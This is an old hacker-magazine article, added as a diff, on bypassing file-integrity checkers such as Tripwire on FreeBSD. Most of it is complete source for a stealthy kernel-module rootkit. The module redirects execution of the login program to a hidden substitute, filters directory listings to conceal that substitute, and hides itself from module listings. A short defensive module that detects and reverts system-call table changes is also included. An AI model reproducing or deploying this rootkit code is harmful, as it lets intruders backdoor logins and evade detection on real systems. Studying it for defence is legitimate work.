@@ -1,0 +1,329 @@
+---[  Phrack Magazine   Volume 7, Issue 51 September 01, 1997, article 09 of 17
+
+
+-------------------------[  Bypassing Integrity Checking Systems
+
+
+--------[  halflife <halflife@infonexus.com>
+
+
+In this day and age where intrusions happen on a daily basis and there is a
+version of "rootkit" for every operating system imaginable, even mostly
+incompetent system administration staff have begun doing checksums on their
+binaries.  For the hacker community, this is a major problem since their very 
+clever trojan programs are quickly detected and removed.  Tripwire is a very 
+popular and free utility to do integrity checking on UNIX systems.  This 
+article explores a simple method for bypassing checks done by tripwire and 
+other integrity checking programs.
+
+First off, how do integrity-checking programs work?  Well, when you first
+install them, they calculate a hash (sometimes multiple hashes) of all the
+binary files you wish to monitor.  Then, periodically, you run the checker
+and it compares the current hash with the previously recorded hash.  If the
+two differ, than something funny is going on, and it is noted.  Several 
+different algorithms exist for doing the hashes, the most popular probably 
+being the MD5 hash.
+
+In the past, there have been problems with several hashes.  MD5 has had some
+collisions, as have many other secure hash algorithms. However, exploiting the 
+collisions is still very very difficult.  The code in this article does not 
+rely on the use of a specific algorithm, rather we focus on a problem of trust 
+-- integrity checking programs need to trust the operating system, and some 
+may even trust libc.  In code that is designed to detect compromises that 
+would by their very nature require root access, you can not trust anything, 
+including your own operating system.
+
+The design of twhack had several requirements.  The first is that it need not
+require a kernel rebuild; loadable kernel modules (lkm) provided a solution
+to this.  The second is that it need be relatively stealthy.  I managed to find
+a simple way to hide the lkm in the FreeBSD kernel (probably works in OpenBSD
+and NetBSD although I have not verified this).  Once you load the module, the
+first ls type command will effectively hide the module from view.  Once hidden
+it can not be unloaded or seen with the modunload(8) command.
+
+First, a little information on FreeBSD loadable modules.  I am using the MISC 
+style of modules, which is basically similar to linux modules.  It gives you 
+pretty much full access to everything.  LKM info is stored in an array of 
+structures.  In FreeBSD 2.2.1 the array has room for 20 modules.
+
+Hiding the modules is really quite simple.  There is a used variable that 
+determines if the module slot is free or not.  When you insert a module, the 
+device driver looks for the first free module entry -- free being defined as 
+an entry with 0 in the used slot and places some info in the structure.  The 
+info is mainly used for unloading, and we are not interested in that, so it is 
+okay if other modules overwrite our structure (some might call that a feature, 
+even).
+
+Next we have to redirect the system calls we are interested in.  This is
+somewhat similar to Linux modules as well.  System calls are stored in an 
+array of structures.  The structure contains a pointer to the system call and 
+a variable specifying the number of arguments.  Obviously, all we are 
+interested in is the pointer.  First we bcopy the structure to a variable, 
+then we modify the function pointer to point to our code.  In our code we can 
+do stuff like old_function.sy_call(arguments) to call the original system call 
+-- quick and painless.
+
+Now that we know HOW to redirect system calls, which ones do we redirect in 
+order to bypass integrity checkers?  Well, there are a number of possibilities.
+You could redirect open(), stat(), and a bunch of others so that reads of your 
+modified program redirect to copies of the unmodified version.  I, however, 
+chose the opposite approach.  Execution attempts of login redirect to another 
+program, opens still go to the real login program.  Since we don't want our 
+alternative login program being detected, I also modified getdirentries so 
+that our program is never in the buffer it returns.  Similar things probably 
+should have been done with syscall 156 which is old getdirentries, but I don't 
+think it is defined and I don't know of anything using it, so it probably does 
+not really matter.
+
+Despite the attempts at keeping hidden, there are a few ways to detect this 
+code.  One of the ways of detecting (and stopping) the code is provided.
+It is a simple stealthy module that logs when syscall addresses change, and
+reverses the changes.  This will stop the twhack module as provided, but is
+FAR from perfect.
+
+What the checking code does is bcopy() the entire sysent array into a local
+copy.  Then it registers an at_fork() handler and in the handler it checks
+the current system call table against the one in memory, if they differ it
+logs the differences and changes the entry back.
+
+<++> twhack/Makefile
+CC=gcc
+LD=ld
+RM=rm
+CFLAGS=-O -DKERNEL -DACTUALLY_LKM_NOT_KERNEL $(RST)
+LDFLAGS=-r
+RST=-DRESTORE_SYSCALLS
+
+all: twhack syscheck
+
+twhack: 
+	$(CC) $(CFLAGS) -c twhack.c
+	$(LD) $(LDFLAGS) -o twhack_mod.o twhack.o
+	@$(RM) twhack.o
+
+syscheck:
+	$(CC) $(CFLAGS) -c syscheck.c
+	$(LD) $(LDFLAGS) -o syscheck_mod.o syscheck.o
+	@$(RM) syscheck.o
+clean:
+	$(RM) -f *.o 
+<-->
+<++> twhack/twhack.c
+/*
+** This code is a simple example of bypassing Integrity checking
+** systems in FreeBSD 2.2. It has been tested in 2.2.1, and
+** believed to work (although not tested) in 3.0.
+**
+** Halflife <halflife@infonexus.com>
+*/
+
+/* change these */
+#define ALT_LOGIN_PATH "/tmp/foobar"
+#define ALT_LOGIN_BASE "foobar"
+
+/* includes */
+#include <sys/param.h>
+#include <sys/ioctl.h>
+#include <sys/proc.h>
+#include <sys/systm.h>
+#include <sys/sysproto.h>
+#include <sys/conf.h>
+#include <sys/mount.h>
+#include <sys/exec.h>
+#include <sys/sysent.h>
+#include <sys/lkm.h>
+#include <a.out.h>
+#include <sys/file.h>
+#include <sys/errno.h>
+#include <sys/syscall.h>
+#include <sys/dirent.h>
+
+/* storage for original execve and getdirentries syscall entries */
+static struct sysent old_execve;
+static struct sysent old_getdirentries;
+
+/* prototypes for new execve and getdirentries functions */
+int new_execve __P((struct proc *p, void *uap, int retval[]));
+int new_getdirentries __P((struct proc *p, void *uap, int retval[]));
+
+/* flag used for the stealth stuff */
+static int hid=0;
+
+/* table we need for the stealth stuff */
+static struct lkm_table *table;
+
+/* misc lkm */
+MOD_MISC(twhack);
+
+/*
+** this code is called when we load or unload the module. unload is
+** only possible if we initialize hid to 1
+*/
+static int
+twhack_load(struct lkm_table *l, int cmd)
+{
+	int err = 0;
+	switch(cmd)
+	{
+		/*
+		** save execve and getdirentries system call entries
+		** and point function pointers to our code
+		*/
+		case LKM_E_LOAD:
+			if(lkmexists(l))
+				return(EEXIST); 
+			bcopy(&sysent[SYS_execve], &old_execve, sizeof(struct sysent));
+			sysent[SYS_execve].sy_call = new_execve;
+			bcopy(&sysent[SYS_getdirentries], &old_getdirentries, sizeof(struct sysent));
+			sysent[SYS_getdirentries].sy_call = new_getdirentries;
+			table = l;
+			break;
+		/* restore syscall entries to their original condition */
+		case LKM_E_UNLOAD:
+			bcopy(&old_execve, &sysent[SYS_execve], sizeof(struct sysent));
+			bcopy(&old_getdirentries, &sysent[SYS_getdirentries], sizeof(struct sysent));
+			break;
+		default:
+			err = EINVAL;
+			break;
+	}
+	return(err);
+}
+
+/* entry point to the module */
+int
+twhack_mod(struct lkm_table *l, int cmd, int ver)
+{
+	DISPATCH(l, cmd, ver, twhack_load, twhack_load, lkm_nullcmd);
+}
+
+/*
+** execve is simple, if they attempt to execute /usr/bin/login
+** we change fname to ALT_LOGIN_PATH and then call the old execve
+** system call.
+*/
+int
+new_execve(struct proc *p, void *uap, int  *retval)
+{
+	struct execve_args *u=uap;
+
+	if(!strcmp(u->fname, "/usr/bin/login"))
+		strcpy(u->fname, ALT_LOGIN_PATH);
+	return old_execve.sy_call(p, uap, retval);
+}
+
+/*
+** in getdirentries() we call the original syscall first
+** then nuke any occurance of ALT_LOGIN_BASE. ALT_LOGIN_PATH
+** and ALT_LOGIN_BASE should _always_ be modified and made
+** very obscure, perhaps with upper ascii characters.
+*/
+int
+new_getdirentries(struct proc *p, void *uap, int *retval)
+{
+	struct getdirentries_args *u=uap;
+	struct dirent *dep;
+	int nbytes;
+	int r,i;
+
+	/* if hid is not set, set the used flag to 0 */
+	if(!hid)
+	{
+		table->used = 0;
+		hid++;
+	}
+	r = old_getdirentries.sy_call(p, uap, retval);
+	nbytes = *retval;
+	while(nbytes > 0)
+	{
+		dep = (struct dirent *)u->buf;
+		if(!strcmp(dep->d_name, ALT_LOGIN_BASE))
+		{
+			i = nbytes - dep->d_reclen;
+			bcopy(u->buf+dep->d_reclen, u->buf, nbytes-dep->d_reclen);
+			*retval = i;
+			return r;
+		}
+		nbytes -= dep->d_reclen;
+		u->buf += dep->d_reclen;
+	}
+	return r;
+}
+<-->
+<++> twhack/syscheck.c
+#include <sys/param.h>
+#include <sys/ioctl.h>
+#include <sys/proc.h>
+#include <sys/systm.h>
+#include <sys/sysproto.h>
+#include <sys/conf.h>
+#include <sys/mount.h>
+#include <sys/exec.h>
+#include <sys/sysent.h>
+#include <sys/lkm.h>
+#include <a.out.h>
+#include <sys/file.h>
+#include <sys/errno.h>
+#include <sys/syscall.h>
+#include <sys/dirent.h>
+
+static int hid=0;
+static struct sysent table[SYS_MAXSYSCALL];
+static struct lkm_table *boo;
+MOD_MISC(syscheck);
+void check_sysent(struct proc *, struct proc *, int);
+
+static int
+syscheck_load(struct lkm_table *l, int cmd)
+{
+	int err = 0;
+	switch(cmd)
+	{
+		case LKM_E_LOAD:
+			if(lkmexists(l))
+				return(EEXIST); 
+			bcopy(sysent, table, sizeof(struct sysent)*SYS_MAXSYSCALL);
+			boo=l;
+			at_fork(check_sysent);
+			break;
+		case LKM_E_UNLOAD:
+			rm_at_fork(check_sysent);
+			break;
+		default:
+			err = EINVAL;
+			break;
+	}
+	return(err);
+}
+
+int
+syscheck_mod(struct lkm_table *l, int cmd, int ver)
+{
+	DISPATCH(l, cmd, ver, syscheck_load, syscheck_load, lkm_nullcmd);
+}
+
+void
+check_sysent(struct proc *parent, struct proc *child, int flags)
+{
+	int i;
+	if(!hid)
+	{
+		boo->used = 0;
+		hid++;
+	}
+	for(i=0;i < SYS_MAXSYSCALL;i++)
+	{
+		if(sysent[i].sy_call != table[i].sy_call)
+		{
+			printf("system call %d has been modified (old: %p new: %p)\n", i, table[i].sy_call, sysent[i].sy_call);
+#ifdef RESTORE_SYSCALLS
+			sysent[i].sy_call = table[i].sy_call;
+#endif
+		}
+	}
+}
+<-->
+
+
+----[  EOF
+
